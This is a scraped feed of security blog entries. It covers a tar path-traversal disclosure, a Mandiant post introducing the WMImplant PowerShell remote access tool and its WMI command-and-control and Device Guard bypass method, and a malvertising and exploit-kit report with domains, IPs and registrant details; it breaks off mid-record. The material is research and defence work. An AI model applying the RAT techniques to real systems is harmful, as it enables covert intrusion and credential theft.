<p><a href=""https://newsfromthelab.files.wordpress.com/2016/10/t216-special-vulnerability-release.png""><img alt=""Tar will happily extract files &amp; directories into an arbitrary location when supplied with a suitably crafted archive file. If a target system is extracting an attacker supplied file, the vulnerability can be exploited to gain file overwrite capability. | We have exploited this vulnerability in environments where tar was run as root to gain root access on the target. In most scenarios this is a non-issue, however as we have witnessed, corner cases can be quite useful. | After the communication with different parties was discontinued for more than 42 days, the decision was made to proceed with our honorable disclosure policy."" class=""alignnone wp-image-2144 size-full"" height=""820"" src=""https://newsfromthelab.files.wordpress.com/2016/10/t216-special-vulnerability-release.png?w=570&#038;h=820"" style=""border: 1px solid #000000;"" width=""570"" /></a></p>
<p><a href=""https://newsfromthelab.files.wordpress.com/2016/10/tar-extract-pathname-bypass-proper.pdf"">tar Extract Pathname Bypass</a></p>
<p>Full Disclosure: POINTYFEATHER / <a href=""http://seclists.org/fulldisclosure/2016/Oct/96"" target=""_blank"">tar Extract Pathname Bypass</a> (CVE-2016-6321)</p><br /> Tagged: <a href=""https://labsblog.f-secure.com/tags/css/"">CSS</a>, <a href=""https://labsblog.f-secure.com/tags/disclosure/"">Disclosure</a>, <a href=""https://labsblog.f-secure.com/tags/kyb3r/"">Kyb3r</a>, <a href=""https://labsblog.f-secure.com/tags/tar/"">tar</a>, <a href=""https://labsblog.f-secure.com/tags/vulnerability/"">Vulnerability</a> <img alt="""" border=""0"" height=""1"" src=""https://pixel.wp.com/b.gif?host=labsblog.f-secure.com&#038;blog=96573572&#038;post=2141&#038;subd=newsfromthelab&#038;ref=&#038;feed=1"" width=""1"" />",https://labsblog.f-secure.com/2016/10/27/css-disclosure-tar-extract-pathname-bypass/
WMImplant – A WMI Based Agentless Post-Exploitation RAT Developed in PowerShell,"<p>Just over one year ago (November 2015), I released <a href=""https://github.com/ChrisTruncer/WMIOps"">WMIOps</a>, a PowerShell
  script that enables a user to carry out different actions via Windows
  Management Instrumentation (WMI) on the local machine or a remote
  machine. WMIOps can:</p>
 <ul> <li>Start or stop a process.</li> <li>Return a list of all running
  processes.</li> <li>Power off, reboot, or log users off the targeted
  system.</li> <li>Get a listing of all files within a directory.</li>
    <li>Read a file’s contents.</li> <li>…and more.</li> </ul>
 <p>As I continued to develop WMIOps and use it during <a href=""https://www.fireeye.com/services/red-team-operations.html"">Mandiant
    Red Team Operations</a>, I realized that it has some of the same
  capabilities that are in Remote Access Tools (RATs). WMIOps’s
  capabilities were in a state of disparate functions, but if I wove
  what existed along with new functionality, I could create a RAT. After
  months of development and internal testing, I’m happy to publicly
  release <a href=""https://github.com/ChrisTruncer/WMImplant"">WMImplant</a>.</p>
 <p>WMImplant leverages WMI for the command and control channel, the
  means for executing actions (gathering data, issuing commands, etc.)
  on the targeted system, and data storage. It is designed to run both
  interactively and non-interactively. When using WMImplant
  interactively, it’s designed to have a menu of commands reminiscent of
  Meterpreter, as shown in Figure 1.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/WMImplant/Fig1.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 1: WMImplant main menu</span></p>
 <h4>Data Storage and Device Guard</h4>
 <p>After spending some time developing WMImplant, I ran into issues
  storing data on systems that used <a href=""https://technet.microsoft.com/en-us/itpro/windows/keep-secure/introduction-to-device-guard-virtualization-based-security-and-code-integrity-policies"">Device
  Guard</a>, a Microsoft security feature added in Windows 10 and Server
  2016. Even though this feature and these operating systems are not
  widely deployed today, I wanted WMImplant to support these systems
  since I expect Device Guard protected systems to become more common,
  especially at security-conscious organizations. Device Guard helps
  protect systems by employing (among other capabilities not detailed here):</p>
 <ol> <li>Code Integrity Policies – When deploying Device Guard,
    administrators will create a code integrity policy (CIP) that
    explicitly defines what is allowed to run on the protected system.
    This granularity can range from file hash, file name, publisher,
    both file name and publisher, and much more. Administrators can
    create the CIP from a gold-imaged computer. Administrators can
    further enhance their CIP by preventing applications that provide
    attackers the ability to bypass Device Guard’s protections from
    running. Finally, administrators can use Group Policy Objects (GPO)
    to enable Device Guard, preventing executables or select scripts
    from running unless explicitly allowed, per the CIP.</li>
    <li>PowerShell Constrained Language Mode – Device Guard auto-enrolls
    PowerShell into <a href=""https://msdn.microsoft.com/en-us/powershell/reference/3.0/microsoft.powershell.core/about/about_language_modes"">ConstrainedLanguage</a>
    mode. Constrained Language mode restricts the cmdlets and data types
    that are allowed to run in PowerShell. In this mode, .NET methods
    are completely blocked unless they are an allowed data type.</li> </ol>
 <p>On a Device Guard protected system, attackers cannot run custom
  executables, and the available PowerShell cmdlets are severely
  restricted. For example, simple functionality such as base64 encoding
  a string is not permitted within Constrained Language mode, as shown
  in Figure 2.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/WMImplant/Fig2.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 2: PowerShell Constrained Language mode
    blocking base64 encoding</span></p>
 <p>At first, I designed WMImplant to use the Windows Registry for data
  storage, as described in <a href=""https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf"">Matt
    Graeber’s WMI research</a>. However, after discussing using the
  Windows Registry for data storage with Matt Dunwoody (a Mandiant
  coworker), he suggested, “Why not also use WMI itself for storage?”</p>
 <p>This conversation led me to research using WMI for data storage. I
  found a proof-of-concept for creating custom WMI properties (Figure 3)
  in FireEye’s report on <a href=""https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf"">WMI
    Offense, Defense, and Forensics</a>.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/WMImplant/Fig3.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 3: Sample code from FireEye report on WMI
    Offense, Defense, and Forensics</span></p>
 <p>However, after testing this code on a Device Guard protected system,
  I discovered that this wasn’t permitted within Constrained Language
  mode, as shown in Figure 4.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/WMImplant/Fig4.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 4: Constrained Language mode blocking WMI
    property creation</span></p>
 <p>After some additional research, I found that within Constrained
  Language mode, users are able to create custom WMI classes. But, as
  evidenced by Figure 4, WMI property creation is not allowed, so this
  wouldn’t work for data storage. Therefore, my next thought was to
  store data in an existing WMI property. In order to leverage an
  existing WMI property, a few conditions would need to be present:</p>
 <ol> <li>The property needs to be of type string.</li> <li>The property
    needs to be writable.</li> <li>The property needs to accept an
    arbitrary length of data.</li> <li>Modifications to the property
    need to not blue screen or degrade use of the targeted system.</li>
    <li>Most importantly, the property needs to be writable within
    Constrained Language mode.</li> </ol>
 <p>I modified an existing PowerShell script to enumerate all WMI
  classes, find the properties of each class, check if each property is
  a string type, and determine if it is writable (the script is <a href=""https://gist.github.com/ChrisTruncer/f3fe3f04b9fdd1310507363f8bdad8be"">available here</a>).</p>
 <p>The script identified a list of candidate WMI properties, but for
  one reason or another, modifications to those that I initially tested
  resulted in “general failures”. Then, I came across a class I have not
  previously used: <a>Win32_OSRecoveryConfiguration</a>. This class has
  a property named “DebugFilePath”, which is the file path where Windows
  will place a memory dump after a computer failure, as shown in Figure 5.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/WMImplant/Fig5.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 5: Win32_OSRecoveryConfiguration’s
    DebugFilePath property</span></p>
 <p>The DebugFilePath appears to only accept a file path, and the
  property should be limited to the length of a valid Windows paths (260
  characters by default or 32k with LongPathsEnabled). In testing,
  however, I discovered that I could write an arbitrary string to the
  DebugFilePath property within Constrained Language mode without
  adversely affecting the targeted system. The final test was to
  determine how much data could be placed in the DebugFilePath property.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/WMImplant/Fig6.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 6: Data storage test within DebugFilePath</span></p>
 <p>Figure 6 shows that the DebugFilePath property can store over 57
  megabytes of data. This satisfied the data storage requirement for
  WMImplant, and future testing showed that the DebugFilePath property
  could store more than 250 megabytes of data. Additionally, using the
  DebugFilePath WMI property for data storage provides the side-benefits
  that it is easily retrievable and modifiable remotely.</p>
 <p>This discovery shaped WMImplant’s command and control communications
  methodology. For commands issued by WMImplant that require data
  storage, the communication process is as follows:</p>
 <ol> <li>Remotely query and obtain the original value for
    Win32_OSRecoveryConfiguration’s DebugFilePath property.</li> <li>Use
    WMImplant to execute a command on the targeted system (such as
    ifconfig), encode the output, and store the encoded results in the
    DebugFilePath property.</li> <li>Remotely query the targeted
    system’s DebugFilePath over WMI to receive the encoded results.</li>
    <li>Decode the results and display them to the console.</li> <li>Set
    the DebugFilePath property on the targeted system back to its
    original value.</li> </ol>
 <p>This methodology for command and control communications minimizes
  the amount of time that the WMI property is modified from its original state.</p>
 <h4>WMImplant Usage</h4>
 <p>I’ve developed WMImplant for both interactive and non-interactive
  use. Users also have the ability to change the user account that is
  authenticating to the targeted machine. As shown in Figure 7, users
  can issue the “change_user” command, provide the username and password
  to use, and then all future commands through WMImplant will
  authenticate with the provided credentials.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/WMImplant/Fig7.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 7: Changing the current user context
    within WMImplant</span></p>
 <p>The easiest way to use WMImplant is interactively; however, that
  isn’t always possible. RATs such as Meterpreter or Cobalt Strike’s
  Beacon allow users to load and execute PowerShell scripts, but both of
  those tools require non-interactive use. That is, the tools accept a
  command to run, execute it, and return the results. They do not allow
  the user to interact with the command while running, however.
  WMImplant includes a built-in command-line generating feature
  specifically for this use case. To generate a command-line, start
  WMImplant and specify the “gen_cli” command.</p>
 <p>After issuing the “gen_cli” command, the user will be presented with
  the normal WMImplant menu and asked for the command to be run.
  WMImplant will then ask for any required information for the command
  specified. Once the user has provided everything that’s required,
  WMImplant will display the command-line command to run in a
  non-interactive manner, as shown in Figure 8.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/WMImplant/Fig8.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 8: “gen_cli” output</span></p>
 <p>At this point, the user can load WMImplant within the RAT of choice,
  and copy and paste the command to run WMImplant non-interactively.</p>
 <p>Another of WMImplant’s capabilities is the ability to run a
  PowerShell script on a remote machine and receive script output. This
  is performed through a multi-step process:</p>
 <ol> <li>The attacking system queries the targeted system’s
    DebugFilePath property to obtain its original value.</li> <li>The
    attacking system reads in the specified PowerShell script, encodes
    it, and stores it in the targeted system’s DebugFilePath
  property.</li> <li>WMI spawns a PowerShell process on the targeted
    system that reads the DebugFilePath property, and decodes the
    PowerShell script.</li> <li>The PowerShell process runs the
    user-specified function and stores the function output in a
  variable.</li> <li>The data in the variable is encoded and stored in
    the DebugFilePath property, and the PowerShell process exits.</li>
    <li>The attacking system makes an additional WMI query for the
    DebugFilePath value (currently storing the encoded data), decodes
    the data, and displays its contents to the console.</li> <li>The
    attacking system replaces the encoded data with the original
    DebugFilePath property contents on the targeted system over
  WMI.</li> </ol>
 <p>This multi-step process is demonstrated in Figure 9.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/WMImplant/remoteposh.gif"" /></p>
 <p>
  <span class=""type-XS"">Figure 9: Remote PowerShell execution</span></p>
 <p>While I’ve only talked about a limited number of WMImplant’s
  features, others include:</p>
 <ul> <li>Setting/removing the “UseLogonCredential” Windows Registry
    value to enable credential caching.</li> <li>Uploading/downloading
  files.</li> <li>Enabling/disabling Windows Remote Management (WinRM)
    to remotely connect to and issue commands on a system using
  PowerShell.</li> <li>Identifying users who have logged in to the
    targeted system.</li> <li>Listing files by directory.</li>
    <li>Reading file contents.</li> <li>…and more.</li> </ul>
 <p>I hope that WMImplant can help others as it has helped us on
  multiple assessments. If you notice any bugs, please let me know and
  I’ll be happy to get a fix pushed!</p>
 <p>WMImplant can be downloaded <a href=""https://github.com/ChrisTruncer/WMImplant"">here</a>.</p>
 <h4>Thanks</h4>
 <p>I want to state that I wouldn’t have been inspired to work on this
  without the <a href=""https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf"">previous
  work</a> of Matt Graeber, Willi Ballenthin, and Claudiu Teodorescu.
  Their work gave me a lot of great ideas that I was able to build upon
  when developing WMImplant.</p>",http://www.fireeye.com/blog/threat-research/2017/03/wmimplant_a_wmi_ba.html
"Still Getting Served: A Look at Recent Malvertising Campaigns Involving
Exploit Kits","<p>Malvertising occurs when an online advertising network knowingly or
  unknowingly serves up malicious advertisements on a website. <a href=""https://www.fireeye.com/blog/threat-research/2015/09/part-1-watering-holes-and-malvertising-uncovering-the-root.html"">Malvertisements</a>
  are a type of “drive-by” threat that tend to result in users being
  infected with malware for simply visiting a website. The victims of
  this threat are often compromised when the malvertisement directs them
  to an exploit kit (EK) landing page. Depending on the applications
  running on the user’s system, the EK can successfully load malware
  into a system without user consent and without tipping the victim off
  that something suspicious is happening.</p>
 <p>It is not uncommon for popular ad servers to redirect to affiliate
  networks – organizations that forward traffic to servers supporting
  other malicious domains, which are referred to as “Cushion Servers” or
  “Shadow Servers”. Under control of EK actors, some cushion servers use
  HTTP redirect protocols such as 301/302/303 etc., or simply iframe
  redirects. In other cases the visitor receives pages containing a
  script that the attacker has injected. This is often the consequence
  of an unmitigated vulnerability that attackers may exploit to their
  advantage. Some campaigns use the <a href=""https://blog.malwarebytes.com/threat-analysis/2016/03/a-look-into-malvertising-attacks-targeting-the-uk/"">domain
  shadowing</a> technique to camouflage rogue ad servers as legitimate advertisers.</p>
 <p>In this blog, we will look into some of the prominent malvertising
  campaigns that were active during the last four months, as well as the
  cushion servers related to different exploit kits.</p>
 <h5>Magnitude EK</h5>
 <p>As seen in Figure 1, Magnitude EK is a popular exploit kit in the
  APAC region. Throughout the final quarter of 2016 and first month of
  2017, FireEye Dynamic Threat Intelligence (DTI) observed consistent
  Magnitude EK hits from several customers, the majority of whom reside
  in the APAC region.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Still%20Getting%20Served%20Zain/Fig1.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 1: Zone distribution for Magnitude EK
    activity as seen on DTI in last 4 months</span></p>
 <p>In all cases, Magnitude EK affected web servers with the following
  header information:</p>
 <p>“Apache/2.2.15 (CentOS) DAV/2 mod_fastcgi/2.4.6”.</p>
 <p>A successful Magnitude EK infection follows the stages seen in
  Figure 2.</p>
 <p>
  <b>
    <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Still%20Getting%20Served%20Zain/Fig2.jpg"" /></b></p>
 <p>
  <span class=""type-XS"">Figure 2: Typical path for malvertising to
    Magnitude EK</span></p>
 <p>
  <b>
    <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Still%20Getting%20Served%20Zain/Fig3.png"" /></b></p>
 <p>
  <span class=""type-XS"">Figure 3: TLD distribution of first layer
    domains with injected redirect script</span></p>
 <p>Throughout the last four months, different malvertising campaigns
  have been associated with a group of first layer compromise pages (the
  TLD distribution is seen in Figure 3), which we will discuss based on
  common indicators. These first layer compromise pages use the same
  injected script used for redirection to Magnitude EK. Figure 4 shows a
  typical injected script used in these campaigns.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Still%20Getting%20Served%20Zain/Fig4.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 4: Typical malicious injected script used
    for redirection to Magnitude domains</span></p>
 <p>In all observed instances, the injected script only appears when the
  site is being loaded through the advertisement (many of which have
  high Alexa ranking, as we will further explain), and not when those
  URLs are accessed directly.</p>
 <p>FireEye notifications have resulted in many of these campaigns being
  taken down, which are mentioned in their respective sections.</p>
 <h5>Through Propeller Ad Networks</h5>
 <p>Table 1 shows the domains we observed that acted as first layer
  compromise domains with the injected script for redirection to
  Magnitude EK being spread from the advertisers, with domains hosted on
  the Webzilla B.V domain hosting service.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Still%20Getting%20Served%20Zain/Tab1.png"" /></p>
 <p>
  <span class=""type-XS"">Table 1: Domains with injected redirect script
    involved in this campaign</span></p>
 <p>These domains appear to be from the same actor due to the similar
  nature of the URI and domain patterns, and the switching to new
  domains after one is used a certain number of times. The current IP
  involved in hosting the active domains is 37.130.229.108. Domains seen
  in Table 1 were redirected by the following advertisers mentioned in
  Table 2.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Still%20Getting%20Served%20Zain/Tab2.png"" /></p>
 <p>
  <span class=""type-XS"">Table 2: Ads used in this campaign</span></p>
 <p>A typical URI seen in this campaign appears as:</p>
 <p>btcpaying[.]uk/?reg=asia&amp;traff=propeller</p>
 <p>On rare occasions the same campaign also used advertiser poptm[.]com
  hosted on Cloudflare, but for the most part the ad networks listed in
  Table 2 were used.</p>
 <h5>The Bill-Finance and Flash Games Gates</h5>
 <p>Some malvertisements have been leading users to Flash game websites.
  In these instances, domains containing the word ‘finance’ in their
  domain name are being used as the first layer of compromise for the
  injected script, which redirects to domains hosting Magnitude EK.
  These Flash sites are registered with ‘AlpNames Limited’ registrar and
  have been hosted using a PlusServer AG server ISP in Germany.</p>
 <p>Registrant information for all of these sites is similar. The
  registrant name is some variation of the name ‘Bill’ and ‘Guil’ (e.g
  ‘Billii’, ‘Billy’ etc.). Registrant numbers have consistently been
  +1.2285161853 or +1.7137015286.</p>
 <p>Table 3 shows the names of these Flash game websites and Table 4
  shows their malvertising information.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Still%20Getting%20Served%20Zain/Tab3.png"" /></p>
 <p>
  <span class=""type-XS"">Table 3: Domains with injected redirect script
    involved in this campaign</span></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Still%20Getting%20Served%20Zain/Tab4.png"" /></p>
 <p>
  <span class=""type-XS"">Table 4: Ads used in this campaign</span></p>
 <p>The ads from click.seodollars[.]com appear to be using the domain
  shadowing technique, while all others are legitimate advertisers.</p>
 <p>AlpNames Limited registrar has taken down domains associated with
  this campaign following notification by FireEye.</p>
 <h5>TTA Adults Limited Using Adcash Ad Group</h5>
 <p>This category of first layer of compromise is for domains registered
  under [.]organisation: TTA ADULTS LIMITED. In all instances, the
  registrant information is as follows:</p>
 <p>Registrant Name: Andrew Musgrove<br /> Registrant [.]organization:
  TTA ADULTS LIMITED<br /> Registrant Street: FOURTH AVENUE UNIT 1B
  FOCUS 4  <br /> Registrant City: LETCHWORTH<br /> Registrant
  State/Province: Hertfordshire<br /> Registrant Postal Code: SG6
  2TU<br /> Registrant Country: GB<br /> Registrant Phone:
  +44.7538421640<br /> Registrant Phone Ext:<br /> Registrant Fax: 
  Registrant Fax Ext:<br /> Registrant Email: musgroveandrew1@<a href=""http://cqcounter.com/whois/domain/gmail.com.html"" title=""whois gmail.com"">gmail[.]com</a></p>
 <p>Domains with this registry information are being redirected by
  advertisers belonging to Adcash group.</p>
 <p>Table 5 shows the names of these campaign domains and Table 6 shows
  their malvertising information.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Still%20Getting%20Served%20Zain/Tab5.png"" /></p>
 <p>
  <span class=""type-XS"">Table 5: Domains with injected redirect script
    involved in this campaign</span></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Still%20Getting%20Served%20Zain/Tab6.png"" /></p>
 <p>
  <span class=""type-XS"">Table 6: Ads used in this campaign</span></p>
 <p>Adcash has closed domain accounts associated with this group
  following notification from FireEye.</p>
 <h5>China Coast</h5>
 <p>This category of first layer of compromise is for domains registered
  under [.]organisation: China Coast. In all cases, the registrant
  information is as follows:</p>
 <p>Registrant Name: Goran L Deelen<br /> Registrant [.]organization:
  China Coast<br /> Registrant Street: Davisstraat 27  <br /> Registrant
  City: Amsterdam<br /> Registrant State/Province: Noord-Holland<br />
  Registrant Postal Code: 1057 TG<br /> Registrant Country: NL
  Registrant Phone: +31.645495613<br /> Registrant Phone Ext:<br />
  Registrant Fax:  Registrant Fax Ext:<br /> Registrant Email:
    antoni309233@<a href=""http://cqcounter.com/whois/domain/gmail.com.html"" title=""whois gmail.com"">gmail[.]com</a></p>
 <p>The malvertisements can be further categorized by different domain
  types. Some of the domain names with traffic from Taiwan are
  redirected by ads.adamoads[.]com (a Chinese advertising site).
  Additional details are shown in Table 7.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Still%20Getting%20Served%20Zain/Tab7.png"" /></p>
 <p>
  <span class=""type-XS"">Table 7: Domains and ad services involved in
    this campaign</span></p>
 <p>Some of the malvertisements in this campaign are redirected through
  other ad sites, including:</p>
 <ul> <li>adexchangeprediction[.]com has been observerd to be redirected
    from serve.popads[.]net.</li> <li>n152adserv[.]com is redirected
    from engine.phn.doublepimp[.]com</li> </ul>
 <p>The following rogue ad subdomains in this campaign use the domain
  shadowing technique:</p>
 <ul> <li>syndication.exoclick[.]com</li>
  <li>track.reacheffect[.]com</li> </ul>
 <p>Table 8 shows other malvertisement cases for Magnitude EK.</p>
 <p>
  <b>
    <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Still%20Getting%20Served%20Zain/Tab8.png"" /></b></p>
 <p>
  <span class=""type-XS"">Table 8: Other domains and ad services involved
    in redirection to Magnitude EK</span></p>
 <h5>Rig EK</h5>
 <p>Rig EK emerged as the most prolific exploit kit in the latter half
  of 2016. Its use in campaigns such as <a href=""http://researchcenter.paloaltonetworks.com/2016/10/unit42-eitest-campaign-evolution-angler-ek-neutrino-rig/"">EITest
  Gate</a>, <a href=""http://researchcenter.paloaltonetworks.com/2016/12/unit42-campaign-evolution-pseudo-darkleech-2016/"">Pseudo-Darkleech</a>
  and <a href=""https://isc.sans.edu/forums/diary/Rig+Exploit+Kit+from+the+Afraidgate+Campaign/21531/"">Afraid
  Gate</a> is well documented, all of which involve scripts being
  injected directly within legitimate sites. However, going with the
  theme of this blog, we will be focusing on noteworthy malvertising
  campaigns involving redirects to Rig EK domains.</p>
 <h5>Casino Theme Ad Domains</h5>
 <p>From the final quarter of 2016 to the start of 2017, we have
  observed [.]info and [.]pw TLD domains acting as intermediate redirect
  domains invoked via legitimate advertisers, which eventually lead to
  Rig EK domains. These domains usually have malicious iframes injected
  into the content for redirection to Rig EK domains. Figure 5 shows the
  normal workflow of the campaign.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Still%20Getting%20Served%20Zain/Fig5.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 5: Ad networks hosted on Google Cloud ISP</span></p>
 <p>Figure 6 show how the ad loads casino-themed domains via 302
  redirect. The ad service loads these sites, which are acting as shadow
  servers to redirect users further to exploit kits, as seen in Figure 7
  and Figure 8.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Still%20Getting%20Served%20Zain/Fig6.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 6: 302 redirect to holdem-pokers.info</span></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Still%20Getting%20Served%20Zain/Fig7.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 7: Malicious iframe from 1st redirect
    domain to .pw domain hosted on domain of 2nd IP</span></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Still%20Getting%20Served%20Zain/Fig8.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 8: Malicious iframe from 2nd layer
    redirect domain loading Rig EK</span></p>
 <p>The most recent whois information for domains related to this
  campaign is as follows:</p>
 <p>Registrant Name: sergei sergeev<br /> Registrant organization:
  Private Person<br /> Registrant Street: novoselov 44<br /> Registrant
  City: ekaterinburg<br /> Registrant State/Province:
  sverdlovskaya<br /> Registrant Postal Code: 140530<br /> Registrant
  Country: RU<br /> Registrant Phone: +7.9868847677<br /> Registrant
  Email: fobos@<a href=""http://cqcounter.com/whois/domain/mail.ru.html"" title=""whois mail.ru"">mail.ru</a></p>
 <p>Admin Name: sergei sergeev<br /> Admin [.]organization: Private
  Person<br /> Admin Street: novoselov 44<br /> Admin City: moscow<br />
  Admin State/Province: moscow<br /> Admin Postal Code: 140530<br />
  Admin Country: RU<br /> Admin Phone: +7.9868847677</p>
 <p>The whois information slightly varies in older domains registered
  for the same campaign, but the organization name, state and country
  remain the same.</p>
 <p>Domains are currently active on IP 78.46.232.211 (first redirect
  after legitimate ad) and 88.198.220.122 (second redirect after
  legitimate ad). Table 9 shows a complete list of the involved domains.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Still%20Getting%20Served%20Zain/Tab9.png"" /></p>
 <p>
  <span class=""type-XS"">Table 9: Casino themed domains involved as
    shadow servers in this campaign</span></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Still%20Getting%20Served%20Zain/Tab10.png"" /></p>
 <p>
  <span class=""type-XS"">Table 10: Ads used in this campaign</span></p>
 <p>All ad service belong to AdCash ad group, which stopped providing
  services to these domains in February 2017.</p>
 <p>Later, the same campaign switched to the following new domains:</p>
 <p>lifeerotic6[.]info; lifeerotic6[.]pw; spoutgame22[.]info;
  spoutgame22[.]pw; lifeerotic[.]info; 100p2[.]pw; 100p0[.]pw;
  sproutgame[.]info; sproutgames[.]info.</p>
 <p>The IP involved with these new domains (other than two mentioned
  earlier) is 78.46.232.214. The new whois information is as follows:</p>
 <p>Registrant Name: sergei sergeev<br /> Registrant Organization:
  Private Person<br /> Registrant Street: 64 Vicar Lane<br /> Registrant
  City: SAPEY<br /> Registrant State/Province: COMMON<br /> Registrant
  Postal Code: WR6 1JY<br /> Registrant Country: GB<br /> Registrant
  Phone: +1.3128595849<br /> Registrant Fax:<br /> Registrant Email:
    fobos@<a href=""http://cqcounter.com/whois/domain/mail.ru.html"" title=""whois mail.ru"">mail.ru</a></p>
 <p>This actor’s new set of domains is now leveraging popular ad service
  popcash[.]net, which FireEye has notified.</p>
 <h4>Sundown EK</h4>
 <p>The following are some of the most prominent malvertising campaigns
  that are currently active for Sundown EK.</p>
 <h5>Neighboring IPs Redirected From Different Set of Ad Networks</h5>
 <p>This campaign has been active using domains hosted on 217.23.13.111
  and 217.23.13.110. Domains hosted on both neighboring addresses have
  their whois information protected by Whois Guard. There are
  similarities in domain names and each group of domains under these IP
  addresses (with a Netherlands geolocation).</p>
 <p>In these instances, legitimate advertisers are redirected to one of
  the domains hosted on these IPs, which further redirects to a Sundown
  EK domain. Figure 9 and Figure 10 show how an ad redirects to
  intermediary domains hosting a malicious iframe to a Sundown EK
  landing page.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Still%20Getting%20Served%20Zain/Fig9.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 9: poptm[.]com redirecting to
    gomedia[.]online hosted on IP 217.23.13.110</span></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Still%20Getting%20Served%20Zain/Fig10.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 10: Redirect domain leading an iframe to
    Sundown EK</span></p>
 <p>There are multiple ad services that are currently redirecting to
  these domains, as seen in Table 11.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Still%20Getting%20Served%20Zain/Tab11.png"" /></p>
 <p>
  <span class=""type-XS"">Table 11: Intermediary domains redirecting to
    Sundown EK and their advertisers seen in this domain</span></p>
 <p>Figure 11 and Figure 12 show details of domains hosted on each
  neighboring IP involved in this campaign.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Still%20Getting%20Served%20Zain/Fig11.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 11: Domains with iframe load to Sundown
    EK hosted on IP 217.23.13.111</span></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Still%20Getting%20Served%20Zain/Fig12.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 12: Domains with iframe load to Sundown
    EK hosted on IP 217.23.13.111</span></p>
 <h5>Leveraging popcash[.]net</h5>
 <p>A group of redirect domains has been leveraging advertiser
  popcash[.]net (Alexa #165) for 302/303 redirects to Sundown EK landing
  pages. In these instances, the advertiser does not directly lead to a
  Sundown EK domain, but leads them via a chain of two domains involved
  in the campaign.</p>
 <p>Table 12 shows domains involved in the campaign where popcash[.]net
  usually leads to a domain via 303 redirect, which further leads to
  second domain (typically via an iframe or another 303 redirect) and
  eventually redirects users to a Sundown EK domain.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Still%20Getting%20Served%20Zain/Tab12.png"" /></p>
 <p>
  <span class=""type-XS"">Table 12: List of shadow server domains involved
    in this campaign</span></p>
 <p>These domains use two IPs, either: 23.238.19.56 or 173.208.245.114.</p>
 <p>A typical example of such redirection can be seen in Figure 13 and
  Figure 14.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Still%20Getting%20Served%20Zain/Fig13.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 13: Chain of two domains being redirected
    from popcash[.]net</span></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Still%20Getting%20Served%20Zain/Fig14.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 14: Second layer of Shadow server domain
    redirects to Sundown EK landing page</span></p>
 <p>popcash[.]net cleaned the malicious ads after notification.</p>
 <h5>Through Propeller Ad Networks</h5>
 <p>This campaign is related to group of domains with the following
  whois information:</p>
 <p>Registrant Name: elise wickson<br /> Registrant [.]organization:
